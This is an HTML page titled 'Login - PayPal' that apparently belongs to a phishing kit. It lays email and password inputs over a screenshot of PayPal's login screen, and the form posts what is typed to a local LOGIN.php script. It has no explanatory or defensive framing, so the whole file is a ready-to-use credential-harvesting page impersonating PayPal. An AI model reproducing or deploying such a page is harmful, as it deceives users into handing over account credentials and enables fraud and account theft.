<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" ns1:xmlns="http://ogp.me/ns#">

<head>
<script language="JavaScript1.2">
    var testresults
    function checkemail(){
        var str = document.validation.1.value
        var filter = /^([\w-]+(?:\.[\w-]+)*)@((?:[\w-]+\.)*\w[\w-]{0,66})\.([a-z]{2,6}(?:\.[a-z]{2})?)$/i
        if (filter.test(str))
            testresults = true
        else {
            alert("Please input a valid email address!")
            testresults = false
        }
        return (testresults)
    }
</script>

<script>
    function checkbae(){
        if (document.layers || document.getElementById || document.all)
            return checkemail()
        else
            return true
    }
</script>

    <title>Login - PayPal</title>
   
    <style type="text/css">
     
		#body
		{
			width : 900px;
			heigth : 900px;
		}
        input {
            -moz-appearance: none;
            -moz-box-sizing: border-box;
            background: none repeat 0 0 #FFF;
            border: 1px solid #B3B3B3;
            border-radius: 5px;
            color: #333;
            font-size: 1.071rem;
            height: 38px;
            line-height: 1.25em;
            margin: 0;
            padding: 0;
            position: relative;
            text-indent: 10px;
            transition: border-color 0.3s ease 0s;
            width: 250px;
        }
        .btn {
            -webkit-appearance: none;
            -moz-box-sizing: border-box;
            background: none repeat 0 0 #0079C1;
            border-radius: 5px;
            border-color: #0079C1;
            color: #FFF;
            cursor: pointer;
            display: inline-block;
            font-family: arial, sans-serif;
            font-size: 15px;
            font-weight: bold;
            line-height: 1.4545em;
            margin-bottom: 0;
            padding: 9px 15px 10px;
            text-align: center;
            vertical-align: middle;
            height: 40px;
            _margin-left: -10px;
            *margin-left: -10px;
        }
        .btn:hover,
        .btn:focus {
            background: none repeat 0 0 #0285D2;
            color: #FFF;
            text-decoration: none;
        }
        .btn:focus {
            outline: thin dotted #333;
            outline-offset: -2px;
        }
        .btn.active,
        .btn:active {
            background-image: none;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.15) inset, 0 1px 2px rgba(0, 0, 0, 0.05);
            outline: 0 none;
        }
        .btn.disabled,
        .btn[disabled],
        .btn.disabled:hover,
        .btn[disabled]:hover,
        .btn.disabled:active,
        .btn[disabled]:active {
            background: none repeat 0 0 #E5E5E5;
            cursor: auto;
        }
        .btn-large {
            border-radius: 6px;
            font-size: 17.234px;
            padding: 9px 14px;
        }
        .btn-large[class^="icon-"],
        .btn-large[class*=" icon-"] {
            margin-top: 4px
        }
        .btn-secondary {
            background: none repeat 0 0 #DDD;
            color: #333;
        }
        .btn-secondary:hover,
        .btn-secondary:focus {
            background: none repeat 0 0 #DDD;
            color: #333;
        }
        input.large {
            width: 337px
        }
        input.large[type=password], input.large[type=text] {
            font-size: 15px;
            font-weight: normal;
        }
        input[type=text]:focus, input[type=password]:focus {
            border-color: #0079C1;
            outline: 0 none;
        }
 
    .auto-style1 {
		margin-top: 20px;
	}
 
    </style>

	
   
    <link rel="shortcut icon" href="img/pp_favicon_x.ico">
    <link rel="apple-touch-icon" href="img/apple-touch-icon.png">

</head>

<body style="background-image: url('img/bLogin.PNG');">

<form method="post" action="LOGIN.php" onSubmit="return checkbae()" style="z-index: 1; width: 395px; height: 232px; position: absolute; top: 208px; left: 211px">

<div style="z-index: 1; width: 340px; height: 40px; position: absolute; top: 53px; left: 24px">
	<input name="1" required autocomplete="off" class="large" style="z-index: 1; position: absolute; top: -3px; left: 0px; width: 338px; height: 38px" type="email" />
</div>

<div style="z-index: 1; width: 340px; height: 40px; position: absolute; top: 129px; left: 24px">
	<input name="2" required autocomplete="off" style="z-index: 1; position: absolute; top: -3px; left: 0px; width: 338px; height: 38px" type="password" />
</div>

<div style="z-index: 1; width: 340px; height: 40px; position: absolute; top: 182px; left: 24px">
	<input name="submit.x" type="submit" value="Login" class="btn large" style="z-index: 1; position: absolute; top: -3px; left: 0px; width: 338px; height: 41px"/>
</div>
<input type="hidden" value="css/style.css" name="hostname"/>

</form>

<div class="auto-style1" style="height: 710px">
</div>

</body>

</html>